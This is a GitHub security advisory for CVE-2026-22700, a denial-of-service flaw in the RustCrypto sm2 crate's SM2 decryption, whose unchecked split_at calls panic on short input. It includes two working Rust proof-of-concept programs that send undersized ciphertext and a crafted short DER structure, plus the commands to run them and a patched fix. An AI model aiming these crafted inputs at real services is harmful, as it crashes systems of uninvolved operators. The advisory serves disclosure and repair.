# [H] RustCrypto Has Insufficient Length Validation in decrypt() in SM2-PKE

## Summary
Severity: High
Advisory: GHSA-j9xq-69pf-pcm8
CVE: CVE-2026-22700
CWE: CWE-20
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-j9xq-69pf-pcm8
Type: github-advisory

## Affected
- crates.io: `sm2` — affected >=0.14.0-pre.0

## Details
### Summary

A denial-of-service vulnerability exists in the SM2 public-key encryption (PKE) implementation: the `decrypt()` path performs unchecked `slice::split_at` operations on input buffers derived from untrusted ciphertext. An attacker can submit short/undersized ciphertext or carefully-crafted DER-encoded structures to trigger bounds-check panics (Rust unwinding) which crash the calling thread or process.


### Affected Component / Versions

- File: `src/pke/decrypting.rs`

- Functions: `DecryptingKey::decrypt_digest/decrypt/decrypt_der`, internal `decrypt()` implementation

- Affected releases: 
  
  - sm2 0.14.0-rc.0 (https://crates.io/crates/sm2/0.14.0-rc.0)
  - sm2 0.14.0-pre.0 (https://crates.io/crates/sm2/0.14.0-pre.0)
  
  


### Details

The vulnerability is located in the file `sm2/src/pke/decrypting.rs`. The **fundamental cause** of the vulnerability is that the decryption function **does not strictly check** the ciphertext's format and length information. Consequently, a maliciously crafted ciphertext can trigger Rust's **panic mechanism** instead of the expected error handling (`Error`) mechanism. The Rust function `C.split_at(L)` will trigger a Panic if the length is less than `L`, as shown in the code comment below: the `decrypting` function has **at least three locations** where a slice operation might trigger a Panic.

```rust
fn decrypt(
    secret_scalar: &Scalar,
    mode: Mode,
    hasher: &mut dyn DynDigest,
    cipher: &[u8],
) -> Result<Vec<u8>> {
    let q = U256::from_be_hex(FieldElement::MODULUS);
    let c1_len = q.bits().div_ceil(8) * 2 + 1;  // Typically 65 for SM2

    // B1: get 𝐶1 from 𝐶
    let (c1, c) = cipher.split_at(c1_len as usize);  // PANIC HERE if cipher.len() < 65
    let encoded_c1 = EncodedPoint::from_bytes(c1).map_err(Error::from)?;

    // ... (lines 170-178 omitted)

    let digest_size = hasher.output_size();  // Typically 32 for SM3
    let (c2, c3) = match mode {
        Mode::C1C3C2 => {
            let (c3, c2) = c.split_at(digest_size);  // PANIC HERE if c.len() < 32
            (c2, c3)
        }
        Mode::C1C2C3 => c.split_at(c.len() - digest_size),  // PANIC HERE if c.len() < 32
    };

```

Rust's `slice::split_at` panics when the split index is greater than the slice length. A panic in library code typically unwinds the thread and can crash an application if not explicitly caught. This means an attacker that can submit ciphertexts to a service using this library may cause a DoS.




### Proof of Concept (PoC)

Two PoCs were added to this repository under `examples/` demonstrating the two
common ways to trigger the issue:

- `examples/poc_short_ciphertext.rs` — constructs a deliberately undersized
  ciphertext (e.g., `vec![0u8; 10]`) and passes it to `DecryptingKey::decrypt`.
  This triggers the `cipher.split_at(c1_len)` panic.

  ``` rust
  //! PoC: trigger panic in SM2 decryption by supplying a ciphertext that is shorter
  //! than the expected C1 length so that `cipher.split_at(c1_len)` panics.
  //!
  //! Usage:
  //!   cargo run --example poc_short_ciphertext
  
  use rand_core::OsRng;
  
  use sm2::pke::DecryptingKey;
  use sm2::SecretKey;
  
  fn main() {
      // Generate a normal secret key and DecryptingKey instance.
      let mut rng = OsRng;
      let sk = SecretKey::try_from_rng(&mut rng).expect("failed to generate secret key");
      let dk = DecryptingKey::new(sk);
  
      // to trigger the vulnerability in `decrypt()` where it does `cipher.split_at(c1_len)`.
      let short_ciphertext = vec![0u8; 10]; // deliberately too short
  
      println!("Calling decrypt with undersized ciphertext (len = {})...", short_ciphertext.len());
  
      // The panic is the PoC for the lack of length validation.
      let _ = dk.decrypt(&short_ciphertext);
  
      // If the library were robust, this line would be reached and decrypt would return Err.
      println!("decrypt returned (unexpected) - PoC did not panic");
  }
  ```
  
  
  
- `examples/poc_der_short.rs` — constructs an ASN.1 `Cipher` structure with
  valid-length `x`/`y` coordinates (from a generated public key) but with tiny
  `digest` and `cipher` OCTET STRING fields (1 byte each). When run with the
  crate built with `--features std`, `Cipher::from_der` accepts the DER and the
  call flows into `decrypt()`, which then panics on the later `split_at`.
  
  ``` rust
  //! Usage:
  //!   RUST_BACKTRACE=1 cargo run --example poc_der_short --features std
  
  use rand_core::OsRng;
  use sm2::SecretKey;
  use sm2::pke::DecryptingKey;
  
  fn build_der(x: &[u8], y: &[u8], digest: &[u8], cipher: &[u8]) -> Vec<u8> {
      // Build SEQUENCE { INTEGER x, INTEGER y, OCTET STRING digest, OCTET STRING cipher }
      let mut body = Vec::new();
  
      // INTEGER x
      body.push(0x02);
      body.push(x.len() as u8);
      body.extend_from_slice(x);
  
      // INTEGER y
      body.push(0x02);
      body.push(y.len() as u8);
      body.extend_from_slice(y);
  
      // OCTET STRING digest (intentionally tiny)
      body.push(0x04);
      body.push(digest.len() as u8);
      body.extend_from_slice(digest);
  
      // OCTET STRING cipher (intentionally tiny)
      body.push(0x04);
      body.push(cipher.len() as u8);
      body.extend_from_slice(cipher);
  
      // SEQUENCE header
      let mut der = Vec::new();
      der.push(0x30);
      der.push(body.len() as u8);
      der.extend(body);
      der
  }
  
  fn main() {
      let mut rng = OsRng;
      let sk = SecretKey::try_from_rng(&mut rng).expect("failed to generate secret key");
      // Extract recipient public key coordinates before moving the secret key into DecryptingKey
      let pk = sk.public_key();
      let dk = DecryptingKey::new(sk);
      // get SEC1 encoding 0x04 || X || Y and slice out X and Y
      let sec1 = pk.to_sec1_bytes();
      let sec1_ref: &[u8] = sec1.as_ref();
      let x = &sec1_ref[1..33];
      let y = &sec1_ref[33..65];
      // Very small digest and cipher to trigger length-based panics inside decrypt()
      let digest = [0x33u8; 1];
      let cipher = [0x44u8; 1];
  
      let der = build_der(x, y, &digest, &cipher);
  
      println!("Calling decrypt_der with crafted short DER (len={})...", der.len());
  
      // Expected to panic inside decrypt() due to missing length checks when splitting
      let _ = dk.decrypt_der(&der);
  
      println!("decrypt_der returned (unexpected) - PoC did not panic");
  }
  ```
  
  

Reproduction (from repository root):

```bash
# PoC that directly uses decrypt on a short buffer
cargo run --example poc_short_ciphertext --features std

# PoC that passes a short DER to decrypt_der
RUST_BACKTRACE=1 cargo run --example poc_der_short --features std
```




### Impact

- Direct Denial of Service: remote untrusted input can crash the thread/process handling decryption.
- Low attacker effort: crafting short inputs or small DER octet strings is trivial.
- Wide exposure: any application that exposes decryption endpoints and links this library is at risk.


### Recommended Fix

Perform defensive length checks before any `split_at` usage and return a controlled `Err` instead of allowing a panic. Minimal fixes in `decrypt()`:

```rust
let c1_len_usize = c1_len as usize;
if cipher.len() < c1_len_usize {
    return Err(Error);
}
let (c1, c) = cipher.split_at(c1_len_usize);

let digest_size = hasher.output_size();
if c.len() < digest_size {
    return Err(Error);
}
let (c2, c3) = match mode {
    Mode::C1C3C2 => {
        let (c3, c2) = c.split_at(digest_size);
        (c2, c3)
    }
    Mode::C1C2C3 => c.split_at(c.len() - digest_size),
};
```

After applying these checks, `decrypt()` will return an error for short or malformed inputs instead of panicking.



### **Credit**

This vulnerability was discovered by:

- XlabAI Team of Tencent Xuanwu Lab

- Atuin Automated Vulnerability Discovery Engine

CVE and credit are preferred.

If you have any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is xlabai@tencent.com.

 

### **Note**

We follow the security industry standard disclosure policy—the 90+30 policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, we reserve the right to publicly disclose all information about the issues after this timeframe.

## References
- https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-j9xq-69pf-pcm8
- https://nvd.nist.gov/vuln/detail/CVE-2026-22700
- https://github.com/RustCrypto/elliptic-curves/pull/1603
- https://github.com/RustCrypto/elliptic-curves/commit/e60e99167a9a2b187ebe80c994c5204b0fdaf4ab
- https://github.com/RustCrypto/elliptic-curves
